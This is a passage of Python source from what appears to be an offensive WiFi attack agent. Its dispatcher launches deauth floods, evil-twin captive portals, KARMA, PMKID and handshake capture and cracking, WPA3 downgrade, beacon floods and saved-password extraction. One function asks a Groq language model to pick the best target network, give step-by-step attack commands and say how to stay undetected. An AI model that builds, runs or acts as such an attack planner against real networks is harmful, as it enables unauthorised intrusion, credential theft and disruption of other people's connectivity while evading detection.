        "message": f"Beacon flood running via {tool} (PID {proc.pid})."
    }


# ══════════════════════════════════════════════════════════════════════════════
#  AI ATTACK PLANNER
# ══════════════════════════════════════════════════════════════════════════════

def ai_attack_plan(networks: list) -> dict:
    """Use Groq AI to plan the best WiFi attack strategy."""
    if not GROQ_AVAILABLE:
        return {"success": False, "message": "Groq not available."}
    if not networks:
        return {"success": False, "message": "No networks to analyze."}

    network_summary = "\n".join([
        f"SSID: {n.get('essid','?')} | "
        f"BSSID: {n.get('bssid','?')} | "
        f"Channel: {n.get('channel','?')} | "
        f"Signal: {n.get('power','?')} | "
        f"Encryption: {n.get('enc','?')}"
        for n in networks[:10]
    ])

    plan = _ask_groq(
        prompt=(
            "Analyze these WiFi networks and provide a detailed "
            "penetration testing plan:\n"
            "1. Which network is the best target and why\n"
            "2. What attack technique to use (PMKID, handshake, evil twin)\n"
            "3. Step-by-step commands to execute\n"
            "4. How to stay undetected\n"
            "5. Expected success probability"
        ),
        context=f"Networks:\n{network_summary}"
    )

    return {
        "success": True,
        "plan":    plan,
        "message": plan
    }


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN DISPATCHER
# ══════════════════════════════════════════════════════════════════════════════

def run_wifi_agent(args: dict, speak=None, player=None) -> str:
    action = args.get("action", "scan")
    speak  = speak or (lambda x: None)

    def say(msg: str):
        short = str(msg)[:300]
        if player:
            player.write_log(f"[WiFi|{OS}] {short}")
        speak(short)

    say(f"WiFi Agent active on {OS} ({ARCH})")

    if action == "scan":
        duration = int(args.get("duration", 15))
        say(f"Scanning networks for {duration}s...")
        r = scan_networks(args.get("interface"), duration)
        say(r["message"])
        return r["message"]

    elif action == "monitor_on":
        r = enable_monitor_mode(args.get("interface"))
        say(r["message"])
        return r["message"]

    elif action == "monitor_off":
        r = disable_monitor_mode(args.get("interface"))
        say(r["message"])
        return r["message"]

    elif action == "randomize_mac":
        r = randomize_mac(args.get("interface"))
        say(r["message"])
        return r["message"]

    elif action == "saved_passwords":
        say("Extracting saved WiFi passwords...")
        r = extract_saved_passwords()
        say(r["message"])
        return r["message"]

    elif action == "pmkid":
        bssid = args.get("bssid") or args.get("target")
        if not bssid:
            return "BSSID required for PMKID attack."
        say(f"Launching PMKID attack on {bssid}...")
        r = pmkid_attack(
            bssid     = bssid,
            interface = args.get("interface"),
            wordlist  = args.get(
                "wordlist", "/usr/share/wordlists/rockyou.txt"
            ),
            timeout   = int(args.get("duration", 30))
        )
        say(r["message"])
        return r["message"]

    elif action == "handshake":
        bssid   = args.get("bssid") or args.get("target")
        channel = args.get("channel", "6")
        if not bssid:
            return "BSSID required."
        say(f"Capturing handshake from {bssid}...")
        r = capture_handshake(
            bssid     = bssid,
            channel   = channel,
            interface = args.get("interface"),
            duration  = int(args.get("duration", 60)),
            essid     = args.get("essid", "")
        )
        say(r["message"])
        return r["message"]

    elif action == "crack":
        cap = args.get("cap_file") or args.get("file")
        if not cap:
            return "cap_file required."
        say("Cracking handshake...")
        r = crack_handshake(
            cap_file  = cap,
            wordlist  = args.get(
                "wordlist", "/usr/share/wordlists/rockyou.txt"
            ),
            bssid     = args.get("bssid"),
            use_rules = args.get("use_rules", True)
        )
        say(r["message"])
        return r["message"]

    elif action == "deauth":
        bssid = args.get("bssid") or args.get("target")
        if not bssid:
            return "BSSID required."
        say(f"Deauth attack on {bssid}...")
        r = deauth_attack(
            bssid      = bssid,
            client     = args.get("client", "FF:FF:FF:FF:FF:FF"),
            interface  = args.get("interface"),
            count      = int(args.get("count", 50)),
            continuous = args.get("continuous", False),
            randomize  = args.get("randomize", True)
        )
        say(r["message"])
        return r["message"]

    elif action == "evil_twin":
        essid = args.get("essid") or args.get("target", "FreeWiFi")
        say(f"Creating Evil Twin: {essid}...")
        r = evil_twin_with_portal(
            essid     = essid,
            interface = args.get("interface"),
            channel   = args.get("channel", "6"),
            bssid     = args.get("bssid"),
            portal    = args.get("portal", True)
        )
        say(r["message"])
        return r["message"]

    elif action == "karma":
        say("Launching KARMA attack...")
        r = karma_attack(args.get("interface"))
        say(r["message"])
        return r["message"]

    elif action == "wpa3_downgrade":
        bssid = args.get("bssid") or args.get("target")
        if not bssid:
            return "BSSID required."
        say(f"WPA3 downgrade on {bssid}...")
        r = wpa3_downgrade(
            bssid     = bssid,
            interface = args.get("interface"),
            channel   = args.get("channel", "6")
        )
        say(r["message"])
        return r["message"]

    elif action == "beacon_flood":
        say("Starting beacon flood...")
        r = beacon_flood(args.get("interface"))
        say(r["message"])
        return r["message"]

    elif action == "ai_plan":
        say("Asking Groq AI to plan WiFi attack strategy...")
        networks = args.get("networks", [])
        if not networks:
            scan = scan_networks(args.get("interface"), 15)
            networks = scan.get("networks", [])
        r = ai_attack_plan(networks)
        say(r["message"])
        return r["message"]

    elif action == "interfaces":
        ifaces = get_interfaces()
        msg    = f"Wireless interfaces ({OS}): {', '.join(ifaces)}"
        say(msg)
        return msg

    else:
        return (
            f"Unknown WiFi action: {action}\n"
            f"Available: scan | monitor_on | monitor_off | randomize_mac | "
            f"saved_passwords | pmkid | handshake | crack | deauth | "
            f"evil_twin | karma | wpa3_downgrade | beacon_flood | "
            f"ai_plan | interfaces"
        )